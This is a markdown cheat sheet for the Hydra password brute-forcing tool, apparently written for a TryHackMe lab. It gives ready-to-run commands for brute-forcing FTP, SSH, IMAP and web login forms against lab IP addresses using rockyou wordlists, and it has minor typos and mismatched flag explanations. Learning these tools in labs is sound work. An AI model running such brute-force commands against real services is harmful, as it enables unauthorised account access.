### Hydra User Guide
- All credit goes to: DarkStar7471 for his THM room located here : https://tryhackme.com/room/hydra

- Hydra is a brute force online password cracking tool, which can be used with a variety of protocols
- Protocols that hydra can work with:
Asterisk, AFP, Cisco AAA, Cisco auth, Cisco enable, CVS, Firebird, FTP,  HTTP-FORM-GET, HTTP-FORM-POST, HTTP-GET, HTTP-HEAD, HTTP-POST, HTTP-PROXY, HTTPS-FORM-GET, 
HTTPS-FORM-POST, HTTPS-GET, HTTPS-HEAD, HTTPS-POST, HTTP-Proxy, ICQ, IMAP, IRC, LDAP, MS-SQL, MYSQL, NCP, NNTP, Oracle Listener, Oracle SID, Oracle, PC-Anywhere, PCNFS, 
POP3, POSTGRES, RDP, Rexec, Rlogin, Rsh, RTSP, SAP/R3, SIP, SMB, SMTP, SMTP Enum, SNMP v1+v2+v3, SOCKS5, SSH (v1 and v2), SSHKEY, Subversion, Teamspeak (TS2), Telnet, 
VMware-Auth, VNC and XMPP.
- Official kali page:
- https://en.kali.tools/?p=220
- Download it (default on kali):
- https://github.com/vanhauser-thc/thc-hydra
#### Hydra Syntax
- The correct hydra syntax is depended upon the service you are going after.  For example if we want to hit ftp we should use:
#### FTP
````
hydra -l user -P passlist.txt ftp://10.10.10.10
````
#### SSH
````
hydra -l <username> -P /usr/share/wordlists/rockyou.txt 10.10.10.10. -t 4 ssh
````
- `-l` is to specify the username 
- `P` is to specify a password list
- `-t` is to specify the number of threads to run hydra with.
- Note: Hydra recommends no more than 4 threads, however you can run it faster with `-t 16`.
#### POST Web Form
- Hydra can be used to brute force web logins as well.
- Step 1: Determine the request made to the form (POST/GET)
- Identify this in the network tab (developer tools), view the source code, or use Burp Suite.
- Syntax:
````
hydra -l <username> -P /usr/share/wordlists/rockyou.txt 10.10.211.150 http-post-form "/:username=^USER^&password=^PASS^:F=incorrect" -vV
````
- `http-post-form` specifies the type of form
- `/login url` the login page URL i.e. `http://dont-brute-force-me.com/login.php`
- `:username` the form field name for the username
- `^USER^` this tells hydra to use the username you specified
- `password` the form field name for the password
- `^PASS^` the password list specified in the command 
- `Login` the failed login message
- `Login failed` is the login failure message that the form specifies 
- `F=inncorrect` the word that appears on the page if the login fails
- `-vV` specifies very verbose output 
- Hydra non default ssh port:
````
hydra -t 16 -l sam -P /usr/share/wordlists/rockyou.txt 10.10.80.187 ssh -s 4567 -vV
````
#### Example Syntax
````
sudo hydra -l admin -P /usr/share/wordlists/rockyou.txt 10.10.10.43 http-post-form "/department/login.php:username=admin&password=^PASS^:Invalid Password!"
sudo hydra -l molly -P /usr/share/wordlists/rockyou.txt 10.10.211.150 http-post-form "/login:username=molly&password=^PASS^:F=incorrect" -V
sudo hydra 10.0.0.1 http-post-form "/admin.php:target=auth&mode=login&user=^USER^&password=^PASS^:invalid" -P /usr/share/wordlists/rockyou.txt -l admin
hydra -l lazie -P /opt/rockyou.txt imap://10.10.251.142 -vV
````











